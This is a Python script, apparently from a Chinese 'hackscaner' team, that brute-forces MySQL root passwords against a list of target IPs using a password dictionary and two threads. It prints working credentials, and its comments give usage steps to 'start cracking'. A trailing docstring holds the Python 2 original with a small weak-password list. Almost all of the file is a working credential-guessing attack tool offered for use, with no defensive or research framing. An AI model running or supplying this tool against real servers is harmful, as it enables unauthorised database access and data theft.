# coding:UTF-8
#Author:M9KJ-TEAM
#Link:hackscaner.com

import mysql.connector
import threading
import time

# 字典导入模块
print('请目录下1.txt的密码字典做好，格式一行一个密码，如果不是，请用notpad++替换！')
def get_password():
    # ------------------------------------------
    with open('1.txt', 'r') as f:
        password_txt = f.readlines()
    find_x = [p.strip() for p in password_txt]
    print('密码导入成功！')
    # -----------------------------------------
    return find_x
def get_host():
  with open('0.txt','r') as f:
    host_txt = f.readlines()
  find_h = []
  for y in host_txt:
    find_h.append(y.strip())
  print ('ip导入成功！')
  print (find_h)
  #-----------------------------------------
  return find_h
ip_x = get_password()
# print(ip_x)

def Batch_Attacter(threadName,delay):
  #coding=gbk
  #目标IP mysql数据库必须开启3360远程登陆端口
  #HOSTIP导入模块
  print ('请将目录下0.txt的ip字典做好，格式一行一个ip，如果不是，请用notpad++替换！')
  #------------------------------------------
  for z in get_host():
    mysql_username = ['root']#账号字典
    #-----------爆破模块-----------------------
    success = False
    port = 3306
    for username in mysql_username:
      for password in ip_x:
        try:
          #db = MySQLdb.connect(host=z, user=username, passwd=password,db='9090')
          cnx = mysql.connector.connect(host=z, user=username, password=password,database='9090')
          success = True
          if success:
            print (threadName, time.ctime(time.time()),username, password )
        except Exception as e:
            print(e)
            continue
        else:
          cnx.close()
    #-----------------------------------------

try:
   t1 = threading.Thread(target=Batch_Attacter,args=('Thread-1',2))
   t2 = threading.Thread(target=Batch_Attacter, args=('Thread-2',4))
   t1.start()
   t2.start()
   t1.join()
   t2.join()
except Exception as e:
   print ("Error: unable to start thread",e)
"""
根据https://www.jb51.net/article/94868.htm 改编
1.Mysql Python版本爆破小脚本，需要安装Python插件MySQL-python.exe，可以看出代码量很少
2.注意：里用户名和密码都是类似字典。
3.用法：
4.保存代码为MysqlDatabaseBlasting.py，
cmd切换到 MysqlDatabaseBlasting.py路径下，并执行 MysqlDatabaseBlasting.py即可开始破解!
源码部分：
import MySQLdb
#coding=gbk
#目标IP mysql数据库必须开启3360远程登陆端口
mysql_username = ('root','test', 'admin', 'user')#账号字典
common_weak_password = ('','123456','test','root','admin','user')#密码字典

success = False
host = "127.0.0.1"#数据库IP地址
port = 3306
for username in mysql_username:
  for password in common_weak_password:
    try:
      db = MySQLdb.connect(host, username, password)
      success = True
      if success:
        print username, password
    except Exception, e:
      pass
"""



